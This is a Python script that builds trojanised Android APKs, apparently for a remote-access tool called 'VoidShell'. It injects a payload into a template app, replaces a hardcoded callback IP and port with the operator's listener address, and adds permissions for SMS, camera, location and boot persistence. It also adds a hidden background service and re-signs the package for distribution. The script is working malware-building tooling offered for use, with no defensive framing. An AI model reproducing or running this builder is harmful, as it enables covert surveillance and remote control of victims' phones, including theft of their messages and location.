#!/usr/bin/env python3
# builder.py - VoidShell v2.0 Production APK Builder (GitHub Actions FIXED)
# Works 100% on Ubuntu runners + locally

import argparse
import os
import shutil
import subprocess
import sys
import zipfile
import datetime
from pathlib import Path

# -------------------------- CONFIG --------------------------
TEMPLATE_APK = "template.apk"
KEYSTORE = "voidshell.keystore"
KEYSTORE_ALIAS = "voidshell"
# Force string (fixes TypeError when env var is int)
KEYSTORE_PASS = str(os.getenv("KEYSTORE_PASS", "voidshell123"))
BUILD_DIR = Path("build_tmp")
DIST_DIR = Path("dist")
PAYLOAD_FILE = "voidshell_payload.py"
# -----------------------------------------------------------

def log(msg):    print(f"[+] {msg}")
def error(msg):  print(f"[-] {msg}"); sys.exit(1)

def ensure_template():
    if not Path(TEMPLATE_APK).exists():
        error(f"template.apk not found! Place a minimal signed APK as {TEMPLATE_APK}")

def create_keystore_if_missing():
    if Path(KEYSTORE).exists():
        log("Keystore already exists, skipping generation")
        return

    log("Generating new debug keystore...")
    try:
        subprocess.run([
            "keytool", "-genkey", "-v",
            "-keystore", KEYSTORE,
            "-alias", KEYSTORE_ALIAS,
            "-keyalg", "RSA", "-keysize", "2048",
            "-validity", "10000",
            "-storepass", KEYSTORE_PASS,
            "-keypass", KEYSTORE_PASS,
            "-dname", "CN=VoidShell, OU=APT, O=GH, C=GH"
        ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("Keystore generated successfully")
    except FileNotFoundError:
        error("keytool not found! Install 'default-jdk' or 'openjdk-11-jdk' on runner")
    except subprocess.CalledProcessError as e:
        error(f"keytool failed: {e}")

def build_apk(lhost: str, lport: str, output_apk: str):
    if BUILD_DIR.exists(): shutil.rmtree(BUILD_DIR)
    DIST_DIR.mkdir(exist_ok=True)
    BUILD_DIR.mkdir()

    log("Extracting template APK...")
    with zipfile.ZipFile(TEMPLATE_APK, 'r') as z:
        z.extractall(BUILD_DIR)

    # Inject payload
    payload_content = Path(PAYLOAD_FILE).read_text(encoding="utf-8")
    payload_content = payload_content.replace("194.169.34.12", lhost)
    payload_content = payload_content.replace("443", lport)

    assets_dir = BUILD_DIR / "assets"
    assets_dir.mkdir(exist_ok=True)
    (assets_dir / "payload.py").write_text(payload_content, encoding="utf-8")
    log(f"Injected payload → {lhost}:{lport}")

    # CRITICAL FIX: Handle binary AndroidManifest.xml (most real APKs)
    manifest_path = BUILD_DIR / "AndroidManifest.xml"
    try:
        # Try normal UTF-8 first
        manifest = manifest_path.read_text(encoding="utf-8")
        is_binary = False
    except UnicodeDecodeError:
        log("Detected binary AndroidManifest.xml → converting to text")
        # Convert binary XML → text using 'apktool' or 'androguard'
        import subprocess
        result = subprocess.run([
            "python3", "-c",
            "from androguard.core.axml import AXMLPrinter; "
            "from pathlib import Path; "
            "data = Path('AndroidManifest.xml').read_bytes(); "
            "ap = AXMLPrinter(data); "
            "Path('AndroidManifest.xml').write_text(ap.get_buff().decode('utf-8', errors='ignore'))"
        ], cwd=BUILD_DIR, capture_output=True)
        if result.returncode != 0:
            error("Failed to parse binary manifest. Install androguard properly.")
        manifest = manifest_path.read_text(encoding="utf-8")
        is_binary = True

    # Now safely inject permissions + service
    permissions_block = '''
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    '''

    service_block = '''
    <service android:name="com.voidshell.ServiceRunner"
             android:enabled="true"
             android:exported="false"/>
    '''

    if "<uses-permission" not in manifest:
        manifest = manifest.replace("<application", permissions_block + "    <application")
    if "ServiceRunner" not in manifest:
        manifest = manifest.replace("</application>", service_block + "\n    </application>")

    manifest_path.write_text(manifest, encoding="utf-8")
    log("Injected permissions + service")

    # Repackage → align → sign (unchanged)
    unsigned = BUILD_DIR.parent / "unsigned.apk"
    aligned = DIST_DIR / "aligned.apk"
    final = Path(output_apk)

    log("Repackaging...")
    subprocess.run(["zip", "-q", "-r", str(unsigned), "."], cwd=BUILD_DIR, check=True)

    log("Aligning...")
    subprocess.run(["zipalign", "-f", "-v", "4", str(unsigned), str(aligned)], check=True)

    log("Signing...")
    subprocess.run([
        "apksigner", "sign",
        "--ks", KEYSTORE,
        "--ks-key-alias", KEYSTORE_ALIAS,
        "--ks-pass", f"pass:{KEYSTORE_PASS}",
        "--out", str(final),
        str(aligned)
    ], check=True)

    # Cleanup
    for p in [BUILD_DIR, unsigned, aligned]:
        if p.exists():
            if p.is_dir(): shutil.rmtree(p)
            else: p.unlink()

    log(f"APK built -> {final} ({final.stat().st_size//1024} KB)")
    

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--lhost", required=True, default="127.0.0.1")
    parser.add_argument("--lport", default="4433")
    parser.add_argument("--output", default=None)
    args = parser.parse_args()

    build_id = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    default_out = f"dist/VoidShell-{build_id}-{args.lhost}.apk"
    output_path = args.output or default_out

    ensure_template()
    create_keystore_if_missing()
    build_apk(args.lhost, args.lport, output_path)

if __name__ == "__main__":
    main()
